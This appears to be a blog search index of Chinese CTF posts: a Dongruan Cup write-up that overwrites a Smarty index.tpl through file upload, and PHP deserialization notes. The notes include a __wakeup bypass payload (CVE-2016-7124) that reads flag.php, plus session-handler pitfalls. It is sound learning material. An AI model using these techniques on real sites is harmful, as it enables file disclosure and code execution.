<p>至此, 所有有环境的文件上传题目就都做完了, 还差 </p>
<ul>
<li><em>后缀大小写绕过</em></li>
<li><em>点绕过</em> </li>
<li><em>空格绕过</em></li>
<li><em>突破 getimagesize()</em></li>
<li><em>突破 exif_imagetype()</em></li>
<li><em>三次渲染</em></li>
</ul>
<p>这几道题由于 <em>ctfhub</em> 上没有环境就没做成, 改天找个时间做做</p>
]]></content>
      <tags>
        <tag>CTF</tag>
        <tag>CtfHub</tag>
      </tags>
  </entry>
  <entry>
    <title>Hello World</title>
    <url>/2021/10/09/hello-world/</url>
    <content><![CDATA[<p>就一篇Hello World你还要看啊 :sweat_smile:</p>
<p><em><strong>没 🌶</strong></em></p>
]]></content>
  </entry>
  <entry>
    <title>东软杯wp</title>
    <url>/2021/12/13/%E4%B8%9C%E8%BD%AF%E6%9D%AFwp/</url>
    <content><![CDATA[<blockquote>
<p>又是一次坐牢 :yum:</p>
</blockquote>
<ul>
<li><strong>odd_upload</strong></li>
<li><strong>Easyinject</strong></li>
</ul>
<p>(后面的题再说吧, 今天估计也只写得完第一道, 线代纯杀人, 题目环境还没了哈哈)</p>
<h2 id="odd-upload"><a href="#odd-upload" class="headerlink" title="odd_upload"></a>odd_upload</h2><blockquote>
<p>唯一做出来的一道题, 彳亍</p>
</blockquote>
<p>​    打开页面之后看到这个</p>
<p><img src="https://cdn.jsdelivr.net/gh/dianzzz/dzimg/data/V-T3bgnTlH_pLU4SBwNYZw.png" alt="img"></p>
<p><img src="https://cdn.jsdelivr.net/gh/dianzzz/dzimg/data/3h1ZdHQ2pUWe6K9RbLujDw.png" alt="img"></p>
<p>​    捕捉到关键词 <strong>smarty</strong>, 开始 <em>Google hack</em>  对了, 题目里面还有一句提示 “目录与官方exp中相同”</p>
<p>​    贴一下 <a href="https://www.smarty.net/docs/zh_CN/"><em>Smarty3</em>官方手册</a> , 然后在里面搜到 “目录文件结构”, 看到这个</p>
<p><img src="https://cdn.jsdelivr.net/gh/dianzzz/dzimg/data/image-20211214000711689.png" alt="image-20211214000711689"></p>
<p>​    开始的时候拿到这个也不知道有啥用, 搜索一下 <em><a href="https://docs.formtools.org/module_development/file_index_tpl/">index.tpl</a></em>, 有这么一句话</p>
<blockquote>
<p>All HTML within Form Tools is generated through the Smarty template language.</p>
</blockquote>
<p>​    (具体用法文档里面有)</p>
<p>​    再结合那个文件上传, 可以想到是通过替换 <em>index.tpl</em> 来控制界面</p>
<p>​    访问 <em>/ templates/index.tpl</em> 能看到<em>tpl</em>文件的源码, <em>copy</em> 下来然后 <em>ls cd cat</em> 一套带走就行了</p>
<p style="text-align:center;"><del> 好水的一道题, 我还做了半天哈哈 </del> 真铸币</p>

<hr>
<p>​    </p>
]]></content>
      <tags>
        <tag>CTF</tag>
        <tag>wp</tag>
      </tags>
  </entry>
  <entry>
    <title>反序列化学习</title>
    <url>/2021/11/04/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%AD%A6%E4%B9%A0/</url>
    <content><![CDATA[<blockquote>
<p>先学习一下 <em>php</em> 中的反序列化, 以后再学学其他语言里面的</p>
</blockquote>
<span id="more"></span>

<h1 id="什么是序列化与反序列化"><a href="#什么是序列化与反序列化" class="headerlink" title="什么是序列化与反序列化"></a>什么是序列化与反序列化</h1><h2 id="函数"><a href="#函数" class="headerlink" title="函数"></a>函数</h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">serialize()		<span class="comment">// 将对象转换成字符串</span></span><br><span class="line">unserialize()		<span class="comment">// 将字符串还原成一个对象</span></span><br></pre></td></tr></table></figure>



<p><strong>示例:</strong></p>
<p><em>序列化</em></p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">test</span></span></span><br><span class="line"><span class="class">    </span>&#123;</span><br><span class="line">        <span class="keyword">private</span> <span class="variable">$flag</span> = <span class="string">&quot;flag&#123;233&#125;&quot;</span>;</span><br><span class="line">        <span class="keyword">public</span> <span class="variable">$a</span> = <span class="string">&quot;aaa&quot;</span>;</span><br><span class="line">        <span class="built_in">static</span> <span class="variable">$b</span> = <span class="string">&quot;bbb&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="variable">$test</span> = <span class="keyword">new</span> test;</span><br><span class="line">    <span class="variable">$data</span> = serialize(<span class="variable">$test</span>);</span><br><span class="line">    <span class="keyword">echo</span> <span class="variable">$data</span>;</span><br><span class="line"> <span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>​    输出</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">O:<span class="number">4</span>:<span class="string">&quot;test&quot;</span>:<span class="number">2</span>:&#123;s:<span class="number">10</span>:<span class="string">&quot;testflag&quot;</span>;s:<span class="number">9</span>:<span class="string">&quot;flag&#123;233&#125;&quot;</span>;s:<span class="number">1</span>:<span class="string">&quot;a&quot;</span>;s:<span class="number">3</span>:<span class="string">&quot;aaa&quot;</span>;&#125;</span><br></pre></td></tr></table></figure>

<p>​    <em>O:4:”test”</em>  =  *Object (对象) * 4个字符: test</p>
<p>​    <em>:2</em> = 对象属性个数为2</p>
<p>​    <em>{}</em> = 属性的字符数 : 属性值</p>
<p>​    <em>s</em>  = string  </p>
<p>​    PS: *s:10: “testflag” * 字符数为10是因为其为 <strong>private</strong> 属性, 会在两侧加入空字节 (即 <em>%00</em> ), 所以在反序列化时 <strong>要补齐两个空字节</strong> </p>
<p><em>反序列化</em></p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line">    <span class="variable">$str</span> = <span class="string">&#x27;O%3A4%3A%22test%22%3A2%3A%7Bs%3A10%3A%22%00test%00flag%22%3Bs%3A9%3A%22flag%7B233%7D%22%3Bs%3A1%3A%22a%22%3Bs%3A3%3A%22aaa%22%3B%7D&#x27;</span>;</span><br><span class="line">    <span class="variable">$data</span> = urldecode(<span class="variable">$str</span>);</span><br><span class="line">    <span class="variable">$obj</span> = unserialize(<span class="variable">$data</span>);</span><br><span class="line"></span><br><span class="line">    var_dump(<span class="variable">$obj</span>);</span><br><span class="line"> <span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>​    输出:</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">object</span>(<span class="built_in">__PHP_Incomplete_Class</span>)<span class="comment">#1 (3) </span></span><br><span class="line">&#123;</span><br><span class="line">  [<span class="string">&quot;__PHP_Incomplete_Class_Name&quot;</span>]=&gt; <span class="keyword">string</span>(<span class="number">4</span>) <span class="string">&quot;test&quot;</span></span><br><span class="line">  [<span class="string">&quot;flag&quot;</span>:<span class="string">&quot;test&quot;</span>:<span class="keyword">private</span>]=&gt; <span class="keyword">string</span>(<span class="number">9</span>) <span class="string">&quot;flag&#123;233&#125;&quot;</span></span><br><span class="line">  [<span class="string">&quot;a&quot;</span>]=&gt; <span class="keyword">string</span>(<span class="number">3</span>) <span class="string">&quot;aaa&quot;</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>​    ( 貌似 <em>private</em> 类型才会被单独标注出来 )</p>
<h2 id="魔术方法"><a href="#魔术方法" class="headerlink" title="魔术方法"></a>魔术方法</h2><p>​    在对反序列化进行利用时, 经常需要通过反序列化中的魔术方法, 检查方法中有无敏感操作来利用</p>
<p><strong>常见方法:</strong></p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">__construct()			<span class="comment">// 创建对象时触发</span></span><br></pre></td></tr></table></figure>

 <figure class="highlight php"><table><tr><td class="code"><pre><span class="line">__destruct()			<span class="comment">// 对象被销毁时触发</span></span><br></pre></td></tr></table></figure>

 <figure class="highlight php"><table><tr><td class="code"><pre><span class="line">__call()			<span class="comment">// 在对象上下文调用不可访问的方法时触发</span></span><br></pre></td></tr></table></figure>

 <figure class="highlight php"><table><tr><td class="code"><pre><span class="line">__callStatic()			<span class="comment">// 在静态上下文中调用不可访问的方法时触发</span></span><br></pre></td></tr></table></figure>

 <figure class="highlight php"><table><tr><td class="code"><pre><span class="line">__get()				<span class="comment">// 用于从不可访问的属性中读取数据</span></span><br></pre></td></tr></table></figure>

 <figure class="highlight php"><table><tr><td class="code"><pre><span class="line">__set()				<span class="comment">// 用于将数据写入不可访问的属性</span></span><br></pre></td></tr></table></figure>

 <figure class="highlight php"><table><tr><td class="code"><pre><span class="line">__isset()			<span class="comment">// 在不可访问的属性上调用 isset() 或 empty() 触发</span></span><br></pre></td></tr></table></figure>

 <figure class="highlight php"><table><tr><td class="code"><pre><span class="line">__unset()			<span class="comment">//在不可访问的属性上使用 unset() 时触发</span></span><br></pre></td></tr></table></figure>

 <figure class="highlight php"><table><tr><td class="code"><pre><span class="line">__invoke()			<span class="comment">// 当脚本尝试将对象调用为函数时触发</span></span><br></pre></td></tr></table></figure>



<p><strong>比较重要的方法:</strong></p>
<ol>
<li><strong>__sleep()</strong> </li>
</ol>
<blockquote>
<p>​    <em>serialize()</em> 函数会检查类中是否存在一个魔术方法 <em>__sleep()</em>. 如果存在, 该方法会先被调用, 然后才执行序列化操作. </p>
<p>​    此功能可以用于清理对象, 并返回一个包含对象中所有应被序列化的变量名称的数组. 如果该方法未返回任何内容, 则 <strong>null</strong> 被序列化, 并产生一个 <strong>E_NOTICE</strong> 级别的错误. </p>
<p>​                                                                    — From PHP手册</p>
</blockquote>
<p>​    该函数在对象被序列化之前触发, 返回需要被序列化存储的成员属性, 可以避免序列化不必要的属性</p>
<p>实例:</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">CTFer</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$C</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$T</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$F</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$C</span>=<span class="string">&quot;&quot;</span>,  <span class="variable">$T</span>=<span class="number">1</span>, <span class="variable">$F</span>=<span class="string">&#x27;Happy&#x27;</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;C = <span class="variable">$C</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;T  = <span class="variable">$T</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;F  = <span class="variable">$F</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@return</span> array</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__sleep</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;CTF也就图一乐,要真选点好的还得看__sleep()\n&quot;</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;C = base64_encode(<span class="keyword">$this</span>-&gt;C);</span><br><span class="line">        <span class="keyword">$this</span>-&gt;CTF = <span class="string">&#x27;for 1 happy&#x27;</span>;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">array</span>(<span class="string">&#x27;C&#x27;</span>, <span class="string">&#x27;T&#x27;</span>,<span class="string">&#x27;CTF&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$CTFer</span> = <span class="keyword">new</span> CTFer(<span class="string">&#x27;D_Z&#x27;</span>);   <span class="comment">// &#x27;D_Z&#x27; 传给 $C</span></span><br><span class="line"><span class="keyword">echo</span> serialize(<span class="variable">$CTFer</span>),<span class="string">&quot;\n&quot;</span>;</span><br></pre></td></tr></table></figure>

<p>输出:</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">CTF也就图一乐,要真选点好的还得看__sleep()</span><br><span class="line">O:<span class="number">5</span>:<span class="string">&quot;CTFer&quot;</span>:<span class="number">3</span>:&#123;s:<span class="number">1</span>:<span class="string">&quot;C&quot;</span>;s:<span class="number">4</span>:<span class="string">&quot;RF9a&quot;</span>;s:<span class="number">1</span>:<span class="string">&quot;T&quot;</span>;i:<span class="number">1</span>;s:<span class="number">3</span>:<span class="string">&quot;CTF&quot;</span>;s:<span class="number">11</span>:<span class="string">&quot;for 1 happy&quot;</span>;&#125;</span><br></pre></td></tr></table></figure>





<ol start="2">
<li><strong>__wakeup()</strong></li>
</ol>
<blockquote>
<p><em>unserialize()</em> 会检查是否存在一个 <em>__wakeup()</em> 方法. 如果存在, 则会先调用 <em>__wakeup</em> 方法, 预先准备对象需要的资源.</p>
<p>​                                                                    — From PHP手册</p>
</blockquote>
<p>​    预先准备对象资源, 无返回值, 常用于反序列化操作中重新建立数据库连接或者执行其他初始化操作</p>
<p>实例:</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">CTFer</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$C</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$T</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$F</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$C</span>=<span class="string">&quot;&quot;</span>,  <span class="variable">$T</span>=<span class="number">1</span>, <span class="variable">$F</span>=<span class="string">&#x27;Happy&#x27;</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;C = <span class="variable">$C</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;T  = <span class="variable">$T</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;F  = <span class="variable">$F</span>;</span><br><span class="line">    &#125;</span><br><span class="line">     </span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;CTF也就图一乐,真要改东西还得看__wakeup()\n&quot;</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;C = <span class="string">&#x27;Dian_Zh&#x27;</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;CTF = <span class="string">&quot;For 1 Happy&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$CTFer</span> = <span class="keyword">new</span> CTFer(<span class="string">&#x27;D_Z&#x27;</span>);</span><br><span class="line"><span class="keyword">echo</span> serialize(<span class="variable">$CTFer</span>),<span class="string">&quot;\n&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> serialize(unserialize(serialize(<span class="variable">$CTFer</span>))),<span class="string">&quot;\n&quot;</span>;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>输出:</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">O:<span class="number">5</span>:<span class="string">&quot;CTFer&quot;</span>:<span class="number">3</span>:&#123;s:<span class="number">1</span>:<span class="string">&quot;C&quot;</span>;s:<span class="number">3</span>:<span class="string">&quot;D_Z&quot;</span>;s:<span class="number">1</span>:<span class="string">&quot;T&quot;</span>;i:<span class="number">1</span>;s:<span class="number">1</span>:<span class="string">&quot;F&quot;</span>;s:<span class="number">5</span>:<span class="string">&quot;Happy&quot;</span>;&#125;</span><br><span class="line">CTF也就图一乐,真要改东西还得看__wakeup()</span><br><span class="line">O:<span class="number">5</span>:<span class="string">&quot;CTFer&quot;</span>:<span class="number">4</span>:&#123;s:<span class="number">1</span>:<span class="string">&quot;C&quot;</span>;s:<span class="number">7</span>:<span class="string">&quot;Dian_Zh&quot;</span>;s:<span class="number">1</span>:<span class="string">&quot;T&quot;</span>;i:<span class="number">1</span>;s:<span class="number">1</span>:<span class="string">&quot;F&quot;</span>;s:<span class="number">5</span>:<span class="string">&quot;Happy&quot;</span>;s:<span class="number">3</span>:<span class="string">&quot;CTF&quot;</span>;s:<span class="number">11</span>:<span class="string">&quot;For 1 Happy&quot;</span>;&#125;</span><br></pre></td></tr></table></figure>



<h2 id="反序列化对象注入"><a href="#反序列化对象注入" class="headerlink" title="反序列化对象注入"></a>反序列化对象注入</h2><h3 id="绕过-wakeup-方法-CVE-2016-7124-漏洞"><a href="#绕过-wakeup-方法-CVE-2016-7124-漏洞" class="headerlink" title="绕过 __wakeup() 方法 (CVE-2016-7124 漏洞)"></a>绕过 <em>__wakeup()</em> 方法 (<em>CVE-2016-7124</em> 漏洞)</h3><p>PHP5 &lt; 5.6.25 或 PHP7 &lt; 7.0.10 适用 <del>(我就说我为啥搞半天都没在我的网站上绕过去)</del> </p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">SoFun</span></span>&#123; </span><br><span class="line">  <span class="keyword">protected</span> <span class="variable">$file</span>=<span class="string">&#x27;index.php&#x27;</span>;</span><br><span class="line">  <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123; </span><br><span class="line">    <span class="keyword">if</span>(!<span class="keyword">empty</span>(<span class="keyword">$this</span>-&gt;file)) &#123;</span><br><span class="line">      <span class="keyword">if</span>(strchr(<span class="keyword">$this</span>-&gt; file,<span class="string">&quot;\\&quot;</span>)===<span class="literal">false</span> &amp;&amp;  strchr(<span class="keyword">$this</span>-&gt;file, <span class="string">&#x27;/&#x27;</span>)===<span class="literal">false</span>)</span><br><span class="line">        show_source(dirname (<span class="keyword">__FILE__</span>).<span class="string">&#x27;/&#x27;</span>.<span class="keyword">$this</span> -&gt;file);</span><br><span class="line">      <span class="keyword">else</span></span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&#x27;Wrong filename.&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;  </span><br><span class="line">  <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">   <span class="keyword">$this</span>-&gt; file=<span class="string">&#x27;index.php&#x27;</span>;</span><br><span class="line">  &#125; </span><br><span class="line">  <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    <span class="title">return</span> &#x27;&#x27; </span>;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;     </span><br><span class="line"><span class="keyword">if</span> (!<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>]))&#123; </span><br><span class="line">  show_source(<span class="string">&#x27;index.php&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123; </span><br><span class="line">  <span class="variable">$file</span>=base64_decode(<span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>]); </span><br><span class="line">  <span class="keyword">echo</span> unserialize(<span class="variable">$file</span>); </span><br><span class="line">&#125;</span><br><span class="line"> <span class="meta">?&gt;</span> <span class="comment">#&lt;!--key in flag.php--&gt;</span></span><br></pre></td></tr></table></figure>

<p>分析:</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">show_source(dirname (<span class="keyword">__FILE__</span>).<span class="string">&#x27;/&#x27;</span>.<span class="keyword">$this</span> -&gt;file);</span><br></pre></td></tr></table></figure>

<p>​    用于读取文件内容, 结合最后一句话可知需要访问 <em>flag.php</em> 页面, 即 <em>$this-&gt;file</em> 应为 <em>flag.php</em> </p>
<p>​    但看到有魔术方法 <em>__wakeup()</em> 将 <em>$this-&gt;file</em> 改为 <em>index.php</em> ,则需要绕过. 绕过原理为: <strong>当序列化字符串中表示对象属性个数的值大于真实的属性个数时, 会跳过 __wakeup() 的执行</strong> </p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">payload: O:<span class="number">5</span>:<span class="string">&quot;SoFun&quot;</span>:<span class="number">2</span>:&#123;S:<span class="number">7</span>:<span class="string">&quot;\00*\00file&quot;</span>;s:<span class="number">8</span>:<span class="string">&quot;flag.php&quot;</span>;&#125;  <span class="comment">//还需要进行base64编码</span></span><br></pre></td></tr></table></figure>

<p>应注意的是, 第一个 <em>S</em> 为大写, 才能将 <em>\00*\00</em> 识别为一个字符. (<a href="http://www.neatstudio.com/show-161-1.shtml">PHP序列化详解</a>) </p>
<h2 id="session-反序列化漏洞"><a href="#session-反序列化漏洞" class="headerlink" title="session 反序列化漏洞"></a><em>session</em> 反序列化漏洞</h2><h3 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h3><ol>
<li><strong>什么是 <em>session</em> ?</strong>  (要写的有点多,就重新开一篇罢 <a href="">session详解</a> <!--还没写--> )</li>
</ol>
<blockquote>
<p>​    <em>Session</em> ：在计算机中，尤其是在网络应用中，称为“会话控制”。</p>
<p>​    <em>Session</em> 对象存储特定用户会话所需的属性及配置信息。这样，当用户在应用程序的 <em>Web</em> 页之间跳转时，存储在 <em>Session</em> 对象中的变量将不会丢失，而是在整个用户会话中一直存在下去。</p>
<p>​    当用户请求来自应用程序的 <em>Web</em> 页时，如果该用户还没有会话，则 <em>Web</em> 服务器将自动创建一个 <em>Session</em> 对象。当会话过期或被放弃后，服务器将终止该会话。                                </p>
<p>​                                                                      — From 百度百科</p>
<p>​    (看个乐就行了, 真要看还得看那篇详解)    </p>
</blockquote>
<ol start="2">
<li><p><strong>什么是 <em>session</em> 反序列化?</strong> </p>
<p><em>PHP</em> 在 <em>session</em> 存储和读取时, 都会有一个序列化和反序列化的过程</p>
<p>相关:</p>
<p><img src="https://cdn.jsdelivr.net/gh/dianzzz/dzimg/data/image-20211124140532082.png" alt="image-20211124140532082"></p>
<p><img src="https://cdn.jsdelivr.net/gh/dianzzz/dzimg/data/image-20211124140619117.png" alt="image-20211124140619117"></p>
<blockquote>
<ul>
<li><em>session.auto_start</em> 用于指定会话模块是否在请求开始时自动启动一个会话</li>
<li><em>session.save_handler</em> 用于设定用户自定义存储函数</li>
<li><em>session.save_path</em> 用于设置 <em>session</em> 的存储路径</li>
<li><em>session.serialize_handler</em> 用于定义用来序列化和反序列化的处理器的名字. 默认为 <em>php</em> , 此外还有 <em>php_serialize</em> / <em>php_binary</em> / <em>wddx</em> </li>
</ul>
</blockquote>
<p>存储机制：</p>
<p>​    <em>php</em> 中以 <strong>文件</strong> 的方式来存储 <em>session</em> 内容, 具体如何存储由 <em>session.save_handler</em> 来决定. 文件名由 <em>sess_sessionid</em> 命名, 文件内容为 <em>session</em> 序列化后的值.</p>
<p>测试一下:</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">ini_set(<span class="string">&#x27;session.serialize_handler&#x27;</span>,<span class="string">&#x27;php_serialize&#x27;</span>);</span><br><span class="line">session_start();</span><br><span class="line"></span><br><span class="line"><span class="variable">$_SESSION</span>[<span class="string">&#x27;name&#x27;</span>] = <span class="string">&#x27;dianzh&#x27;</span>;</span><br></pre></td></tr></table></figure>

<p>​    运行之后会在 <em>session.save_path</em> 中设置的路径中生成一个 <em>session</em> 文件,如下</p>
<p><img src="https://cdn.jsdelivr.net/gh/dianzzz/dzimg/data/image-20211124161542035.png" alt="image-20211124161542035"></p>
<p>​    将 <em>php_serialize</em> 换成 <em>php</em> 后, 文件如下</p>
<p><img src="https://cdn.jsdelivr.net/gh/dianzzz/dzimg/data/image-20211124161721445.png" alt="image-20211124161721445"></p>
<p>​    换成 <em>php_binary</em> 后, 如下</p>
<p><img src="https://cdn.jsdelivr.net/gh/dianzzz/dzimg/data/image-20211124161853373.png" alt="image-20211124161853373"></p>
<p>​    <em>wddx</em></p>
<p><img src="https://cdn.jsdelivr.net/gh/dianzzz/dzimg/data/image-20211124162001935.png" alt="image-20211124162001935"></p>
<p>​    处理器的存储格式差异, 会造成在 <em>session</em> 序列化和反序列化处理器设置不当时产生安全隐患</p>
</li>
</ol>
]]></content>
      <tags>
        <tag>笔记</tag>
        <tag>反序列化</tag>
      </tags>
  </entry>
</search>
